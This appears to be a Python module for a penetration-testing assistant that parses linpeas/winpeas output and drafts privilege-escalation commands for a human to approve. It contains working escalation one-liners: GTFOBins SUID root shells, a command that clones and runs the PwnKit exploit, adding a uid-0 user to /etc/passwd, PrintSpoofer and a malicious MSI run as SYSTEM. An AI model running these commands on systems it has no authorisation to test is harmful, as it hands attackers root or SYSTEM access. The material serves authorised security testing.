"""Task 4 — post-exploitation / privesc: ingest linpeas/winpeas, propose the escalation.

On a foothold you run linpeas (or winpeas), get a wall of coloured output, and have to spot the
one line that matters. This module ingests that output, identifies the privesc VECTORS in it
(SUID GTFOBins, a NOPASSWD sudo rule, a dangerous capability, PwnKit, SeImpersonate, an
AlwaysInstallElevated policy), and proposes the escalation for the strongest one — a drafted
command grounded in the KB, which the human approves and fires like every other command.

Propose/ground/draft ONLY. Parsing is pure text; proposing returns data. Nothing here runs a
command or reaches an execution surface.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Callable

_SEV_ORDER = {"high": 0, "medium": 1, "low": 2}


@dataclass
class Vector:
    kind: str            # suid | sudo | capabilities | pwnkit | kernel | writable-passwd |
                         # se-impersonate | always-install-elevated | unquoted-service | creds
    detail: str          # the specific binary / rule / detail
    severity: str = "medium"
    evidence: str = ""
    platform: str = "linux"

    def to_dict(self) -> dict[str, Any]:
        return {"kind": self.kind, "detail": self.detail, "severity": self.severity,
                "evidence": self.evidence[:200], "platform": self.platform}


@dataclass
class PrivescDraft:
    applicable: bool
    vector: Vector | None = None
    command: str = ""
    args: list[str] = field(default_factory=list)
    shell_line: str = ""     # when the escalation is a shell one-liner run on the foothold
    explanation: str = ""
    hypothesis: str = ""
    citations: list[dict[str, str]] = field(default_factory=list)
    dangerous: bool = True

    def to_dict(self) -> dict[str, Any]:
        return {
            "applicable": self.applicable,
            "vector": self.vector.to_dict() if self.vector else None,
            "command": self.command,
            "args": list(self.args),
            "shell_line": self.shell_line,
            "explanation": self.explanation,
            "hypothesis": self.hypothesis,
            "citations": list(self.citations),
            "dangerous": self.dangerous,
        }


# GTFOBins SUID escalations we recognise by binary name (the common ones linpeas flags red).
_SUID_GTFO = {
    "find": "find . -exec /bin/sh -p \\; -quit",
    "vim": "vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
    "nmap": "nmap --interactive   # then: !sh",
    "bash": "bash -p",
    "less": "less /etc/profile   # then: !/bin/sh -p",
    "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'",
    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'",
    "cp": "cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p",
    "env": "env /bin/sh -p",
    "awk": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
}


def parse_peas(text: str) -> list[Vector]:
    """Extract privesc vectors from linpeas / winpeas output. Pure; case-insensitive scan."""
    if not text:
        return []
    low = text.lower()
    vectors: list[Vector] = []

    # --- linux ------------------------------------------------------------- #
    # PwnKit (CVE-2021-4034): pkexec present + polkit. linpeas flags it explicitly.
    if "cve-2021-4034" in low or "pwnkit" in low or ("pkexec" in low and "polkit" in low):
        vectors.append(Vector("pwnkit", "pkexec (CVE-2021-4034 PwnKit)", "high",
                              _line_with(text, "pkexec") or "pkexec present"))
    # Baron Samedit sudo (CVE-2021-3156)
    if "cve-2021-3156" in low or "baron samedit" in low:
        vectors.append(Vector("kernel", "sudo Baron Samedit (CVE-2021-3156)", "high",
                              _line_with(text, "samedit")))
    # NOPASSWD sudo rules
    for m in re.finditer(r"\(([^)]*)\)\s*nopasswd:\s*(\S+)", text, re.IGNORECASE):
        binp = m.group(2)
        vectors.append(Vector("sudo", f"NOPASSWD: {binp}", "high", m.group(0)))
    # SUID GTFOBins binaries
    for name in _SUID_GTFO:
        if re.search(rf"/({name})\b", low) and ("suid" in low or "suid" in low):
            vectors.append(Vector("suid", name, "high", _line_with(text, "/" + name)))
    # capabilities
    if "cap_setuid" in low or "cap_dac_read_search" in low:
        vectors.append(Vector("capabilities", "cap_setuid / cap_dac_read_search", "high",
                              _line_with(text, "cap_")))
    # world-writable /etc/passwd
    if re.search(r"/etc/passwd.*writable", low) or "writable /etc/passwd" in low:
        vectors.append(Vector("writable-passwd", "/etc/passwd is writable", "high",
                              _line_with(text, "/etc/passwd")))

    # --- windows ----------------------------------------------------------- #
    if "seimpersonateprivilege" in low or "seimpersonate" in low:
        vectors.append(Vector("se-impersonate", "SeImpersonatePrivilege", "high",
                              _line_with(text, "seimpersonate"), platform="windows"))
    if "alwaysinstallelevated" in low:
        vectors.append(Vector("always-install-elevated", "AlwaysInstallElevated = 1", "high",
                              _line_with(text, "alwaysinstallelevated"), platform="windows"))
    if "unquoted" in low and "service" in low:
        vectors.append(Vector("unquoted-service", "unquoted service path", "medium",
                              _line_with(text, "unquoted"), platform="windows"))

    # de-dup by (kind, detail), strongest severity kept
    dedup: dict[tuple[str, str], Vector] = {}
    for v in vectors:
        key = (v.kind, v.detail.lower())
        if key not in dedup or _SEV_ORDER.get(v.severity, 3) < _SEV_ORDER.get(dedup[key].severity, 3):
            dedup[key] = v
    return sorted(dedup.values(), key=lambda v: _SEV_ORDER.get(v.severity, 3))


def _line_with(text: str, needle: str) -> str:
    for ln in text.splitlines():
        if needle.lower() in ln.lower():
            return ln.strip()[:200]
    return ""


def _kb_citations(kb_search: Callable[[str], list[Any]] | None, query: str, limit: int = 2) -> list[dict[str, str]]:
    if kb_search is None:
        return []
    try:
        hits = list(kb_search(query))[:limit]
    except Exception:  # noqa: BLE001
        return []
    out: list[dict[str, str]] = []
    for h in hits:
        eid = (str(h.get("id") or h.get("entry_id") or h.get("title") or "") if isinstance(h, dict)
               else str(getattr(h, "id", "") or getattr(h, "entry_id", "") or getattr(h, "title", "")))
        if eid:
            out.append({"type": "kb", "id": eid})
    return out


def propose(
    vectors: list[Vector],
    state: Any = None,
    kb_search: Callable[[str], list[Any]] | None = None,
) -> PrivescDraft:
    """Draft the escalation for the strongest vector, grounded in the KB. Returns data; the human
    runs it on the foothold."""
    if not vectors:
        return PrivescDraft(False, explanation="no privesc vector found in the pasted output.")
    v = vectors[0]
    cites = _kb_citations(kb_search, f"{v.kind} privilege escalation") + [
        {"type": "state", "id": f"privesc:{v.kind}:{v.detail}"}
    ]
    base = dict(applicable=True, vector=v, citations=cites, dangerous=True,
                hypothesis=f"{v.detail} gives a path to root/SYSTEM on this foothold")

    if v.kind == "sudo":
        binp = v.detail.split(":")[-1].strip()
        name = binp.rsplit("/", 1)[-1]
        line = _SUID_GTFO.get(name, f"sudo {binp}   # check GTFOBins for the escalation")
        return PrivescDraft(shell_line=f"sudo {line}" if not line.startswith("sudo") else line,
                            command="sudo", args=[binp],
                            explanation=f"NOPASSWD sudo on {binp}: run its GTFOBins escalation to "
                                        "get a root shell. Human runs it on the foothold.", **base)
    if v.kind == "suid":
        line = _SUID_GTFO.get(v.detail, f"{v.detail} ...   # GTFOBins SUID escalation")
        return PrivescDraft(shell_line=line, command=v.detail, args=[],
                            explanation=f"SUID {v.detail} is a GTFOBins escalation; the drafted "
                                        "one-liner spawns a shell with the file's owner (root).",
                            **base)
    if v.kind == "pwnkit":
        return PrivescDraft(
            shell_line="git clone https://github.com/ly4k/PwnKit /tmp/pk && cd /tmp/pk && ./PwnKit",
            command="pkexec", args=["--version"],
            explanation="PwnKit (CVE-2021-4034) escalates via a memory-corruption in pkexec. "
                        "Drafted the public exploit fetch+run; verify the polkit version first.",
            **base)
    if v.kind == "capabilities":
        return PrivescDraft(
            shell_line="/path/to/binary -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
            command="getcap", args=["-r", "/"],
            explanation="A cap_setuid capability lets the binary drop to uid 0. Confirm which "
                        "binary holds it, then invoke it to spawn a root shell.", **base)
    if v.kind == "writable-passwd":
        return PrivescDraft(
            shell_line="openssl passwd -1 -salt x pass  # then add root2:HASH:0:0::/root:/bin/bash to /etc/passwd",
            command="echo", args=["writable /etc/passwd"],
            explanation="A writable /etc/passwd lets you add a uid-0 account with a known "
                        "password, then `su` to it.", **base)
    if v.kind == "se-impersonate":
        return PrivescDraft(
            shell_line="PrintSpoofer.exe -i -c cmd   (or GodPotato -cmd \"cmd /c whoami\")",
            command="PrintSpoofer.exe", args=["-i", "-c", "cmd"],
            explanation="SeImpersonatePrivilege enables a potato-family attack (PrintSpoofer / "
                        "GodPotato) to impersonate SYSTEM. Run on the Windows foothold.", **base)
    if v.kind == "always-install-elevated":
        return PrivescDraft(
            shell_line="msiexec /quiet /qn /i evil.msi   (msi built with msfvenom, runs as SYSTEM)",
            command="msiexec", args=["/quiet", "/qn", "/i", "evil.msi"],
            explanation="AlwaysInstallElevated runs any MSI as SYSTEM. Build a payload MSI and "
                        "install it.", **base)
    # kernel / unquoted-service / generic
    return PrivescDraft(
        shell_line=f"# escalate via: {v.detail}",
        command="echo", args=[v.detail],
        explanation=f"Vector identified ({v.kind}: {v.detail}). Match it to the KB's escalation "
                    "for this exact case and draft the concrete step.", **base)


def ingest_and_propose(
    text: str,
    state: Any = None,
    kb_search: Callable[[str], list[Any]] | None = None,
) -> dict[str, Any]:
    """The endpoint helper: parse the pasted peas output and draft the top escalation."""
    vectors = parse_peas(text)
    draft = propose(vectors, state, kb_search)
    return {
        "vectors": [v.to_dict() for v in vectors],
        "draft": draft.to_dict(),
    }
